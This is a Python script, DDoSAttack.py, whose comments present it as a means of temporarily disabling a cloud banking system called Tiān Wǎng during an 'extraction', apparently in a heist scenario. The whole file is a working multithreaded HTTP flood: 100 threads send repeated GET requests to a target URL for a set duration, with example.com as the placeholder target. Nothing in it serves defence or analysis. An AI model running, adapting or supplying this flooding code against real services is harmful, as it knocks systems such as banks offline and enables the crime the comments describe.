```python
# DDoSAttack.py
# This module simulates a Distributed Denial of Service (DDoS) attack on the Tiān Wǎng cloud banking system.
# It is used as a last resort to temporarily disable the system, allowing for a safe extraction.

import time
import threading
import requests

def send_request(target_url):
    """
    Sends a single HTTP request to the target URL to simulate part of the DDoS attack.
    
    Args:
    target_url (str): The URL of the target system to flood with requests.
    """
    try:
        # Sending a request to the target URL
        response = requests.get(target_url)
        print(f"Request sent to {target_url} - Status Code: {response.status_code}")
    except Exception as e:
        print(f"Failed to send request to {target_url}: {e}")

def ddos_attack(target_url, duration, thread_count):
    """
    Simulates a DDoS attack by sending multiple HTTP requests to the target URL using threading.
    
    Args:
    target_url (str): The URL of the target system to attack.
    duration (int): Duration of the attack in seconds.
    thread_count (int): Number of threads to use for sending requests.
    """
    threads = []
    end_time = time.time() + duration

    # Creating and starting threads
    for _ in range(thread_count):
        thread = threading.Thread(target=send_requests_continuously, args=(target_url, end_time))
        threads.append(thread)
        thread.start()

    # Waiting for all threads to finish
    for thread in threads:
        thread.join()

    print("DDoS attack completed.")

def send_requests_continuously(target_url, end_time):
    """
    Continuously sends requests to the target URL until the specified end time.
    
    Args:
    target_url (str): The URL to attack.
    end_time (float): Time when the attack should stop.
    """
    while time.time() < end_time:
        send_request(target_url)

if __name__ == "__main__":
    # Example usage
    target_url = "http://example.com/api"
    duration = 60  # 1 minute
    thread_count = 100  # Number of threads
    ddos_attack(target_url, duration, thread_count)
```
